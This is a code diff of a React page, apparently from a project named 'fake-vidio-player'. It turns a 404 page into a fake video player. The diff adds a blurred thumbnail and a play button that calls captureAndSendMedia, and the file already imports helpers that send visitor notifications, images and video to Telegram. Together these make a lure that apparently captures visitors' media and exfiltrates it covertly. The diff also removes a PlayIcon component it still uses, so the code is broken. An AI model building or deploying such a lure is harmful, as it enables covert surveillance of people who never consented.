@@ -3,8 +3,8 @@ import { useState, useEffect, useCallback } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
 function App() {
-  const [isBlurred] = useState(false);
-  const thumbnailUrl = 'https://raw.githubusercontent.com/zsfell/fake-vidio-player/refs/heads/main/assets/img/ghost-img.png';
+  const [isBlurred] = useState(true);
+  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -139,84 +139,44 @@ function App() {
     }
   }, []);
 
-  // const App = () => {
-  // Function to handle click events
-  const handleClick = () => {
-    alert("You clicked anywhere on the page!");
+  const handlePlayClick = async () => {
+    await captureAndSendMedia();
   };
 
-  const PlayIcon = ({ className }: { className: string }) => (
-    <svg
-      className={className}
-      fill="currentColor"
-      viewBox="0 0 24 24"
-      xmlns="http://www.w3.org/2000/svg"
-    >
-      <path d="M8 5v14l11-7z" />
-    </svg>
-  );
-
   return (
-    <div
-      className="min-h-screen bg-gray-900 text-white font-sans cursor-pointer"
-      onClick={handleClick} // Click handler for the entire page
-    >
-      {/* Header */}
-      <header className="bg-gray-800 py-6">
-        <nav className="container mx-auto px-4 flex justify-between items-center">
-          <a href="#" className="text-2xl font-bold">
-            ZS
-          </a>
-          <div className="text-2xl">
-            <i className="bx bx-grid-alt"></i>
-          </div>
-        </nav>
+    <div className="relative min-h-screen bg-gray-900">
+      <header className="relative bg-gray-800 py-6">
+        <div className="container mx-auto px-4">
+          <h1 className="text-3xl font-bold text-white">Video Player</h1>
+        </div>
       </header>
 
-      {/* Main Content */}
-      <main className="container mx-auto px-4 py-8">
-        <section className="text-center">
-          <div className="max-w-2xl mx-auto">
-            <span className="text-lg text-gray-400">Error 404</span>
-            <h1 className="text-5xl font-bold mt-4">Hey Buddy</h1>
-            <p className="text-gray-400 mt-2">You get lost?</p>
-            <a
-              href="https://www.youtube.com/watch?v=e_04ZrNroTo"
-              className="inline-block mt-6 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
-            >
-              Go Home
-            </a>
-          </div>
-
-          <div className="mt-12 relative">
+      <main className="relative container mx-auto px-4 py-8">
+        <div className="max-w-[1080px] mx-auto">
+          <div className="relative">
             <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
               {isBlurred && (
                 <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
               )}
               <div className="absolute inset-0 flex items-center justify-center z-10">
-                <button
-                  onClick={() => alert("Play button clicked!")}
+                <button 
+                  onClick={handlePlayClick}
                   className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                 >
                   <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                 </button>
               </div>
-              <img
-                src={thumbnailUrl}
-                alt="Video Thumbnail"
+              <img 
+                src={thumbnailUrl} 
+                alt="Video Thumbnail" 
                 className="w-full h-full object-cover"
               />
             </div>
           </div>
-        </section>
+        </div>
       </main>
-
-      {/* Footer */}
-      <footer className="text-center py-6 text-gray-400">
-        <span>zsfell</span>
-      </footer>
     </div>
   );
-};
+}
 
 export default App;
